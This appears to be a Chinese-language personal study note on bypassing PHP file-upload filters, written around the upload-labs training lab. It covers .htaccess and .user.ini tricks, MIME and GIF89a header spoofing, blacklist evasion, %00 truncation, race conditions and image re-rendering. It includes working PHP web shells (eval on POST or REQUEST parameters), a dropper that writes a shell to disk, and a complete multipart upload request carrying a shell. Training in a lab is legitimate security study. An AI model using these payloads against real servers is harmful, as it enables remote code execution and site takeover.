
---
![[upload.jpg]]

![[upload_tree.jpg]]
➢ PHP-原生态-文件上传-前后端验证

➢ PHP-原生态-文件上传-类型文件头验证

➢ PHP-原生态-文件上传-后缀黑白名单验证

➢ PHP-原生态-文件上传-解析配置&二次渲染

➢ PHP-原生态-文件上传-逻辑缺陷&函数缺陷
#upload-labs-docker知识点

**1、前端JS**

如何判断是否是前端验证呢？

首先抓包监听，如果上传文件的时候还没有抓取到数据包，但是浏览器就提示文件类型不正确的话，那么这个多半就是前端校验了

**2、.htaccess或者.user.ini**
	`.htaccess`
	`AddType application/x-httpd-php .png`
	`.user.ini`
	`auto_prepend_file =getshell.png`
**3、MIME类型**
	Content-Type：image/png
**4、文件头判断**
	
```
GIF89a
```
**5、黑名单-过滤不严**
	无递归，pphphp
**6、黑名单-过滤不严**
	系统大小写敏感属性
**7、低版本GET-%00截断**
```
	get请求会自动解码一次
	/var/www/html/upload/x.php%00
```
**8、低版本POST-%00截断**
```
	post请求不会自动解码，需要手工解码一次
	../upload/x.php%00 二次解码
```
**9、黑名单-过滤不严**
```
（可使用fuzz工具爆破）
	php3等
	phtml
	1. <script language="php">eval($_POST['cmd']);phpinfo();</script>
	
```
**10、逻辑不严-条件竞争**
```
	例如：存在先保存文件，在进行过滤删除
	
	代码功能是执行该代码时，会自动创建一个文件，并写入恶意代码
	
	<?php fputs(fopen('xiao.php','w'),'<?php eval($_REQUEST[1]);?>');?>
	
	上传不断发包
	
	请求不断发包
```
**11、二次渲染**
```
（网站可能会对图片进行渲染，从而使植入的代码被删除）（010editor工具）
首先
	先搞个正常图片，上传导出渲染后的图片
然后
	对比保留部分，在保留部分添加后门代码

最后
	利用提示的文件包含执行图片后门代码
```
**12、函数缺陷**
```
（保存的文件名可控）
	move_uploaded_file 1.php/.
```
**13、代码审计-数组绕过**
```
	-----------------------------174283082921961
	Content-Disposition: form-data; name="save_name[0]"
	http://2.php/
	-----------------------------174283082921961
	Content-Disposition: form-data; name="save_name[2]"
	gif
```


#附录、无法连接时，指令

[[CSRF跨站请求伪造&Referer同源&置空&配合XSS&Token值校验&复用删除]]

文件上传请求包构造

```

POST /index.php?s=/home/page/uploadImg HTTP/1.1
Host: xx.xx.xx.xx:xxxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: multipart/form-data; boundary=--------------------------921378126371623762173617
Content-Length: 265

----------------------------921378126371623762173617
Content-Disposition: form-data; name="editormd-image-file"; filename="test.<>php"
Content-Type: text/plain

<?php echo 'hello!!!';@eval($_POST['aw'])?>
----------------------------921378126371623762173617--

```


